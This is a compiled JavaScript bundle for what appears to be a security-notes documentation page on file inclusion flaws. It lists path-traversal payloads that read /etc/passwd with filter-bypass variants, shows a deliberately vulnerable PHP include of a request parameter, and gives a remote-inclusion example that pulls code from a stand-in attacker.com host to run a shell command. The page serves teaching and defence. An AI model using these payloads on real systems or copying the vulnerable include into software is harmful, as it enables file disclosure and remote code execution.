"use strict";(self.webpackChunk_2h3ph3rd_github_io=self.webpackChunk_2h3ph3rd_github_io||[]).push([[1879],{3905:(e,t,n)=>{n.d(t,{Zo:()=>u,kt:()=>h});var r=n(7294);function i(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function a(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);t&&(r=r.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,r)}return n}function l(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?a(Object(n),!0).forEach((function(t){i(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):a(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function s(e,t){if(null==e)return{};var n,r,i=function(e,t){if(null==e)return{};var n,r,i={},a=Object.keys(e);for(r=0;r<a.length;r++)n=a[r],t.indexOf(n)>=0||(i[n]=e[n]);return i}(e,t);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);for(r=0;r<a.length;r++)n=a[r],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(i[n]=e[n])}return i}var o=r.createContext({}),c=function(e){var t=r.useContext(o),n=t;return e&&(n="function"==typeof e?e(t):l(l({},t),e)),n},u=function(e){var t=c(e.components);return r.createElement(o.Provider,{value:t},e.children)},p="mdxType",d={inlineCode:"code",wrapper:function(e){var t=e.children;return r.createElement(r.Fragment,{},t)}},f=r.forwardRef((function(e,t){var n=e.components,i=e.mdxType,a=e.originalType,o=e.parentName,u=s(e,["components","mdxType","originalType","parentName"]),p=c(n),f=i,h=p["".concat(o,".").concat(f)]||p[f]||d[f]||a;return n?r.createElement(h,l(l({ref:t},u),{},{components:n})):r.createElement(h,l({ref:t},u))}));function h(e,t){var n=arguments,i=t&&t.mdxType;if("string"==typeof e||i){var a=n.length,l=new Array(a);l[0]=f;var s={};for(var o in t)hasOwnProperty.call(t,o)&&(s[o]=t[o]);s.originalType=e,s[p]="string"==typeof e?e:i,l[1]=s;for(var c=2;c<a;c++)l[c]=n[c];return r.createElement.apply(null,l)}return r.createElement.apply(null,n)}f.displayName="MDXCreateElement"},1358:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>o,contentTitle:()=>l,default:()=>d,frontMatter:()=>a,metadata:()=>s,toc:()=>c});var r=n(7462),i=(n(7294),n(3905));const a={},l="\ud83d\udcc1 File inclusion",s={unversionedId:"security/web/file-inclusion",id:"security/web/file-inclusion",title:"\ud83d\udcc1 File inclusion",description:"A file inclusion vulnerability is caused when a malicious user can access or upload unathorized files or directories.",source:"@site/docs/security/05-web/file-inclusion.md",sourceDirName:"security/05-web",slug:"/security/web/file-inclusion",permalink:"/docs/security/web/file-inclusion",draft:!1,editUrl:"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/docs/security/05-web/file-inclusion.md",tags:[],version:"current",frontMatter:{},sidebar:"securitySidebar",previous:{title:"\ud83c\udf10 Web",permalink:"/docs/security/web/"},next:{title:"\ud83d\udd24 Fuzzing",permalink:"/docs/security/web/fuzzing"}},o={},c=[{value:"Path traversal",id:"path-traversal",level:2},{value:"LFI",id:"lfi",level:2},{value:"RFI",id:"rfi",level:2}],u={toc:c},p="wrapper";function d(e){let{components:t,...n}=e;return(0,i.kt)(p,(0,r.Z)({},u,n,{components:t,mdxType:"MDXLayout"}),(0,i.kt)("h1",{id:"-file-inclusion"},"\ud83d\udcc1 File inclusion"),(0,i.kt)("p",null,"A file inclusion vulnerability is caused when a malicious user can access or upload unathorized files or directories."),(0,i.kt)("p",null,"There are three main types of file inclusion vulnerabilities:"),(0,i.kt)("ul",null,(0,i.kt)("li",{parentName:"ul"},"Path traversal"),(0,i.kt)("li",{parentName:"ul"},"Local File Intrusion (LFI)"),(0,i.kt)("li",{parentName:"ul"},"Remote File Inclusion (RFI)")),(0,i.kt)("h2",{id:"path-traversal"},"Path traversal"),(0,i.kt)("p",null,"The attacker can access files in other directories of the server.\nUsually, this type of attack is based on dot-dot-slash notation."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-bash"},"# basic dot-dot-slash notation\n../../../etc/passwd\n\n# ascii version\n%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd\n\n# truncate string (PHP < 5.3.4) using null byte\n# useful when something is appended like \".php\"\n../../../etc/passwd0x00\n../../../etc/passwd%00\n../../../etc/passwd\\0\n\n# if validation is done over the first match of the string 'etc' and what is right after\n../../../etc/../etc/passwd\n\n# if '/etc/passwd' is filtered\n../../../etc/./passwd\n\n# if '../' is removed\n....//....//....//....//....//etc/passwd\n")),(0,i.kt)("h2",{id:"lfi"},"LFI"),(0,i.kt)("p",null,"In Local File Intrusion (LFI) the attacker makes the server to include other local script files."),(0,i.kt)("p",null,"The main difference with path traversal is the execution of scripts decided by the attacker."),(0,i.kt)("p",null,"In PHP this could happen with functions like ",(0,i.kt)("inlineCode",{parentName:"p"},"include"),", ",(0,i.kt)("inlineCode",{parentName:"p"},"required"),", ",(0,i.kt)("inlineCode",{parentName:"p"},"include_once"),", and ",(0,i.kt)("inlineCode",{parentName:"p"},"required_once"),"."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-php"},'<?php\n  include("./pages/".$_GET["page"]);\n?>\n')),(0,i.kt)("h2",{id:"rfi"},"RFI"),(0,i.kt)("p",null,"In Remote File Inclusion (RFI) the attacker makes the server to include other script files from external sources."),(0,i.kt)("p",null,"For example, the function ",(0,i.kt)("inlineCode",{parentName:"p"},"include")," can also import external sources:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-php"},'<?php\n  include("http://attacker.com/inject.php");\n?>\n')),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-php",metastring:'title="inject.php"',title:'"inject.php"'},'<?php\n  print(exec("hostname"));\n?>\n')))}d.isMDXComponent=!0}}]);